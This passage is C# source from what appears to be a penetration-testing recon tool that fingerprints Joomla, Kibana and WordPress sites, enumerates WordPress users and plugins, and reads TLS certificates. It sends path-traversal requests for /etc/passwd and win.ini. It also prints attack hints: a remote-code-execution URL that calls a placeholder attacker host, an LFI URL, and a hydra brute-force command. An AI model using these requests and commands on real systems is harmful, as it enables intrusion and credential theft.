                            string versionText = adminXML.PageText.Remove(0, adminXML.PageText.IndexOf("<version>") + "<version>".Length);
                            versionText = versionText.Substring(0, versionText.IndexOf("</version"));
                            toReturn += "-- " + "Joomla! Version: {versionText}".Recolor(Color.Orange) + Environment.NewLine;
                            // https://vulncheck.com/blog/joomla-for-rce
                            // - CVE-2023-23752 - 4.0.0 through 4.2.7
                        }
                    }
                    // Why is this in else?
                    else
                    {
                        var tinyXML = GetHTTPInfo($"{URL}plugins/editors/tinymce/tinymce.xml");
                        if (tinyXML.StatusCode == HttpStatusCode.OK)
                        {
                            // https://joomla.stackexchange.com/questions/7148/how-to-get-joomla-version-by-http
                            toReturn += "- TinyMCE use case hit - Bug Reelix to finish this!" + Environment.NewLine;
                        }
                    }
                }

                // Kibana
                if (PageText.Contains("kbn-injected-metadata"))
                {
                    toReturn += "-- " + "Kibana Detected".Recolor(Color.Orange) + Environment.NewLine;
                    string versionText = PageText.Remove(0, PageText.IndexOf("&quot;version&quot;:&quot;") + 26);
                    versionText = versionText.Substring(0, versionText.IndexOf("&quot;"));
                    toReturn += "--- Version: " + versionText + Environment.NewLine;
                    toReturn += "---- Kibana versions before 5.6.15 and 6.6.1 -> CVE-2019-7609 -> https://github.com/mpgn/CVE-2019-7609" + Environment.NewLine;
                }
                // Wordpress
                //if (PageText.Contains("/wp-content/themes/") && (PageText.Contains("/wp-includes/") || PageText.Contains("/wp-includes\\")))
                // Some Wordpress pages don't contain "wp-content" (Ref: HTB Acute)
                if (PageText.Contains("/wp-includes/") || PageText.Contains("/wp-includes\\"))
                {
                    toReturn += "- " + "WordPress detected!".Recolor(Color.Orange) + Environment.NewLine;

                    // Basic version check
                    if (PageText.Contains("<meta name=\"generator\" content=\"WordPress "))
                    {
                        string wpVersion = PageText.Remove(0, PageText.IndexOf("<meta name=\"generator\" content=\"WordPress "));
                        wpVersion = wpVersion.Remove(0, wpVersion.IndexOf("WordPress ") + "WordPress ".Length);
                        wpVersion = wpVersion.Substring(0, wpVersion.IndexOf("\"")).Trim();
                        toReturn += "-- WordPress Version: " + wpVersion + Environment.NewLine;
                    }

                    // Basic User Enumeration - Need to combine these two...
                    List<string> wpUsers = new();
                    var wpUserTestOne = Web.GetHTTPInfo($"{baseURL}/wp-json/wp/v2/users");
                    if (wpUserTestOne.StatusCode == HttpStatusCode.OK)
                    {
                        var document = JsonDocument.Parse(wpUserTestOne.PageText);
                        foreach (JsonElement element in document.RootElement.EnumerateArray())
                        {
                            string wpUserName = element.GetProperty("name").GetString();
                            string wpUserSlug = element.GetProperty("slug").GetString();
                            if (!wpUsers.Contains(wpUserName))
                            {
                                wpUsers.Add(wpUserSlug);
                                toReturn += "-- " + $"Wordpress User Found: {wpUserName} (Username: {wpUserSlug})".Recolor(Color.Orange) + Environment.NewLine;
                            }
                        }
                    }

                    var wpUserTestTwo = Web.GetHTTPInfo($"{baseURL}/index.php/wp-json/wp/v2/users");
                    if (wpUserTestTwo.StatusCode == HttpStatusCode.OK)
                    {
                        var document = JsonDocument.Parse(wpUserTestTwo.PageText);
                        foreach (JsonElement element in document.RootElement.EnumerateArray())
                        {
                            string wpUserName = element.GetProperty("name").GetString();
                            string wpUserSlug = element.GetProperty("slug").GetString();
                            if (!wpUsers.Contains(wpUserName))
                            {
                                wpUsers.Add(wpUserSlug);
                                toReturn += "-- " + $"Wordpress User Found: {wpUserName} (Username: {wpUserSlug})".Recolor(Color.Orange) + Environment.NewLine;
                            }
                        }
                    }

                    // List Plugins
                    if (PageText.Contains("/wp-content/plugins/"))
                    {
                        List<string> pluginList = PageText.Split(new string[] { "/wp-content/plugins/" }, StringSplitOptions.None).ToList();

                        // If it contains a plugin, then splitting by the plugin string has the first item being the text before it

                        // To Test:
                        // 2+ Plugins
                        // See if there is a commonality in the format
                        if (pluginList.Count >= 2)
                        {
                            pluginList.RemoveAt(0);
                        }
                        foreach (string plugin in pluginList)
                        {
                            // Plugin Found: adrotate/library/jquery.adrotate.clicktracker.js
                            // /wp-content/plugins/adrotate/readme.txt
                            string thePlugin = plugin.Substring(0, plugin.IndexOf(" ") - 1);
                            toReturn += $"-- Plugin Found: {thePlugin}" + Environment.NewLine;
                        }
                    }
                    if (PageText.Contains("/wp-with-spritz/"))
                    {
                        toReturn += "-- " + "Vulnerable Plugin Detected".Recolor(Color.Orange) + $" - {urlWithSlash}wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/etc/passwd" + Environment.NewLine;
                    }
                    else if (PageText.Contains("/wp-content/plugins/social-warfare"))
                    {
                        toReturn += "-- " + "Possible Vulnerable Plugin Detected (Vuln if <= 3.5.2) - CVE-2019-9978".Recolor(Color.Orange) + $" - {urlWithSlash}wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://yourIPHere:5901/rce.txt" + Environment.NewLine;
                        toReturn += "--- rce.txt: <pre>system('cat /etc/passwd')</pre>" + Environment.NewLine;
                        toReturn += $"--- Verify Version: {urlWithSlash}wp-content/plugins/social-warfare/readme.txt - Scroll down to Changelog" + Environment.NewLine;
                    }

                    // Check for public folders
                    var contentDir = Web.GetHTTPInfo($"{urlWithSlash}wp-content/");
                    if (contentDir.StatusCode == HttpStatusCode.OK && contentDir.PageText.Length != 0)
                    {
                        toReturn += "-- " + $"{urlWithSlash}wp-content/ is public".Recolor(Color.Orange) + Environment.NewLine;
                    }
                    var pluginsDir = Web.GetHTTPInfo($"{urlWithSlash}wp-content/plugins/");
                    if (pluginsDir.StatusCode == HttpStatusCode.OK && pluginsDir.PageText.Length != 0)
                    {
                        toReturn += "-- " + $"{urlWithSlash}wp-content/plugins/ is public".Recolor(Color.Orange) + Environment.NewLine;
                    }

                    // And then return the general wpscan enum info
                    toReturn += $"-- User Enumeration: wpscan --url {urlWithSlash} --enumerate u1-5" + Environment.NewLine;
                    toReturn += $"-- Plugin Enumeration: wpscan --url {urlWithSlash} --enumerate p" + Environment.NewLine;
                    toReturn += $"-- User + Plugin Enumeration: wpscan --url {urlWithSlash} --enumerate u1-5,p" + Environment.NewLine;
                    toReturn += $"-- Aggressive Plugin Enumeration (Slow): wpscan --url {urlWithSlash} --plugins-detection aggressive" + Environment.NewLine;

                    // Checking for wp-login.php
                    var wplogin = GetHTTPInfo($"{baseURL}/wp-login.php");
                    string wpLoginPath = "/blog/wp-login.php";
                    if (wplogin.StatusCode == HttpStatusCode.OK && wplogin.PageText.Contains("action=lostpassword"))
                    {
                        wpLoginPath = "/wp-login.php";
                    }

                    // More aggressive plugin detection
                    // TODO: Add more

                    // wpDiscuz
                    // Can also be found by view-source of a specific page
                    // Maybe find the first post, and enumerate all wp* ?
                    var wpdiscuz = GetHTTPInfo($"{urlWithSlash}wp-content/plugins/wpdiscuz/readme.txt");
                    if (wpdiscuz.StatusCode == HttpStatusCode.OK && wpdiscuz.PageText.Contains("wpDiscuz "))
                    {
                        toReturn += "-- wpDiscuz detected - Bug Reelix to update this.".Recolor(Color.Orange) + Environment.NewLine;
                        toReturn += "--- If 7.0.4 -> https://www.exploit-db.com/raw/49967" + Environment.NewLine;
                    }

                    // simple-backup (Vuln plugin)
                    var wpSimpleBackup = GetHTTPInfo($"{urlWithSlash}wp-content/plugins/simple-backup/readme.txt");
                    if (wpSimpleBackup.StatusCode == HttpStatusCode.OK && wpSimpleBackup.PageText.Contains("Name: Simple Backup"))
                    {
                        toReturn += "-- " + "Wordpress Plugin Simple Backup Detected - Bug Reelix to update this.".Recolor(Color.Orange) + Environment.NewLine;
                        toReturn += "--- https://packetstormsecurity.com/files/131919/WordPress-Simple-Backup-Plugin-Arbitrary-Download.html" + Environment.NewLine;
                    }
                    toReturn += $"-- hydra -L users.txt -P passwords.txt {DNS} http-post-form \"{wpLoginPath}:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:The password you entered for the username\" -I -t 50" + Environment.NewLine;
                }
            }

            // SSL Cert
            if (SSLCert != null)
            {
                X509Certificate2 theCert = SSLCert;
                string certIssuer = theCert.Issuer;
                string certSubject = theCert.Subject;
                // string certAltName = SSLCert.SubjectName.Name;
                toReturn += "- SSL Cert Issuer: " + certIssuer + Environment.NewLine;
                toReturn += "- SSL Cert Subject: " + certSubject + Environment.NewLine;
                if (theCert.Extensions != null)
                {
                    // Console.WriteLine("Extensions is not null");
                    X509ExtensionCollection extensionCollection = theCert.Extensions;
                    foreach (X509Extension extension in extensionCollection)
                    {
                        // Oid.FriendlyName (Note: Can be null)
                        // - Windows: Subject Alternative Name
                        // - Linux: X509v3 Subject Alternative Name
                        // - Note: Only in English - Not cross-language friendly :(
                        // Subject Alternative Name == Oid 2.5.29.17
                        if (extension.Oid.Value == "2.5.29.17")
                        {
                            AsnEncodedData asndata = new(extension.Oid, extension.RawData);
                            List<string> formattedValues = asndata.Format(true).Split(new[] { Environment.NewLine }, StringSplitOptions.None).ToList();
                            string itemList = "";
                            foreach (string item in formattedValues)
                            {
                                string theItem = item;
                                theItem = theItem.Replace("DNS Name=", "");
                                if (theItem.Contains("("))
                                {
                                    theItem = theItem.Remove(0, theItem.IndexOf("(") + 1).Replace(")", "");
                                    itemList += theItem + ",";
                                }
                                else
                                {
                                    itemList += theItem + ",";
                                }
                            }
                            itemList = itemList.Trim(',');
                            toReturn += "- Subject Alternative Name: " + itemList + Environment.NewLine;
                        }
                    }
                }
            }

            // Clean off any redundant newlines
            toReturn = toReturn.TrimEnd(Environment.NewLine.ToCharArray());

            return toReturn;
        }

        public static string TestBaseLFI(string ip, int port)
        {
            string result = General.BannerGrab(ip, port, "GET /../../../../../../etc/passwd HTTP/1.1" + Environment.NewLine + "Host: " + ip + Environment.NewLine + Environment.NewLine, 2500);
            if (result.Contains("root"))
            {
                return "- /etc/passwd File Found VIA Base LFI! --> GET /../../../../../../etc/passwd" + Environment.NewLine + result;
                // Need to format this better...

            }
            // Windows 1 (Windows app running on Windows)
            result = General.BannerGrab(ip, port, "GET /../../../../../../windows/win.ini HTTP/1.1\r\nHost: " + ip + "\r\n\r\n", 2500);
            if (result.Contains("for 16-bit app support"))
            {
                return "- /windows/win.ini File Found VIA Base LFI! --> GET /../../../../../../windows/win.ini" + Environment.NewLine + result;
            }
            // Windows 2 (Linux app running on Windows)
            result = General.BannerGrab(ip, port, "GET /../../../../../../windows/win.ini HTTP/1.1\nHost: " + ip + "\n\n", 2500);
            if (result.Contains("for 16-bit app support"))
            {
                return "- /windows/win.ini File Found VIA Base LFI! --> GET /../../../../../../windows/win.ini" + Environment.NewLine + result;
            }
            return "";
        }

        public static bool BasicHTTPSTest(string target, int port)
        {
            try
            {
                string theString = DownloadString($"https://{target}:{port}/", Method: HttpMethod.Head).Text;
                return true;
            }
            catch (Exception ex)
            {
                // Nope
                if (ex.Message != "The SSL connection could not be established, see inner exception.")
                {
                    Console.WriteLine("In nope with: " + ex.Message);
                }
                // This sometimes reaches here on actual https sites - Need to investigate...
                // Either a non-accessable HEAD request or an invalid SSL Cert (Doesn't my Web class handle that... ?)
                return false;
            }
        }

        public static (string Text, HttpStatusCode StatusCode) DownloadString(string url, HttpMethod Method = null, HttpContent PostContent = null, string Cookie = null, NetworkCredential Creds = null, string UserAgent = null)
        {
            // For invalid HTTPS Certs
            var handler = new HttpClientHandler()
            {
                ServerCertificateCustomValidationCallback = HttpClientHandler.DangerousAcceptAnyServerCertificateValidator
            };

            // Note: This cannot go at the top due to the various custom values being set for it
            HttpClient httpClient = new HttpClient(handler);
            string toReturn = "";

            if (Method == null)
            {
                Method = HttpMethod.Get;
            }

            HttpRequestMessage request = new HttpRequestMessage(Method, url);
            if (PostContent != null)
            {
                request.Method = HttpMethod.Post;
                request.Content = PostContent;
            }

            // Cookie
            if (Cookie != null)
            {
                request.Headers.Add("Cookie", Cookie);
            }

            // Creds
            if (Creds != null)
            {
                string auth = "Basic " + Convert.ToBase64String(Encoding.ASCII.GetBytes(Creds.UserName + ":" + Creds.Password));
                request.Headers.Add("Authorization", auth);
            }

            // UserAgent
            if (UserAgent != null)
            {
                request.Headers.Add("User-Agent", UserAgent);
            }

            HttpStatusCode statusCode;
            using (HttpResponseMessage response = httpClient.Send(request))
            {
                statusCode = response.StatusCode;
                using (StreamReader readStream = new(response.Content.ReadAsStream()))
                {
                    toReturn = readStream.ReadToEnd();
                }
            }
            return (toReturn, statusCode);
        }
    }
}
